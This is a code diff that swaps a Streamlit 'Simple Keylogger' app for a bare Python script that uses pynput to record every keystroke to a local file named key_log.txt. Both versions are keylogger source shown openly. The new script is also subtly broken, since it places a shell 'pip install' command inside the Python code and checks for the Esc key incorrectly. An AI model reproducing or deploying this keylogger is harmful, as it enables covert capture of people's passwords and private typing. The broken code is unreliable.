@@ -1,35 +1,27 @@
-# keylogger_streamlit.py
-import streamlit as st
-from pynput import keyboard
-import threading
+pip install pynput
+from pynput.keyboard import Listener
 
-# Global variable to store captured keys
-captured_keys = []
+# Path to save the log file
+log_file_path = "key_log.txt"
 
-# Keylogger function
-def keylogger():
-    def on_press(key):
-        try:
-            captured_keys.append(f'Key {key.char} pressed')
-        except AttributeError:
-            captured_keys.append(f'Special key {key} pressed')
+# Function to handle key press events
+def on_press(key):
+    try:
+        # Log regular key presses
+        with open(log_file_path, "a") as log_file:
+            log_file.write(f"{key.char}")
+    except AttributeError:
+        # Log special keys like space, enter, etc.
+        with open(log_file_path, "a") as log_file:
+            log_file.write(f" [{key}] ")
 
-    def on_release(key):
-        if key == keyboard.Key.esc:
-            return False  # Stop the listener
+# Function to handle key release events
+def on_release(key):
+    # Stop logging if the Esc key is pressed
+    if key == key.esc:
+        return False
 
-    # Collect events until released
-    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
-        listener.join()
+# Set up listener for key press and release events
+with Listener(on_press=on_press, on_release=on_release) as listener:
+    listener.join()
 
-# Streamlit UI
-st.title("Simple Keylogger")
-
-if st.button("Start Keylogger"):
-    # Start the keylogger in a separate thread
-    threading.Thread(target=keylogger, daemon=True).start()
-    st.write("Keylogger is running...")
-
-# Display captured keys
-if st.button("Show Captured Keys"):
-    st.write(captured_keys)
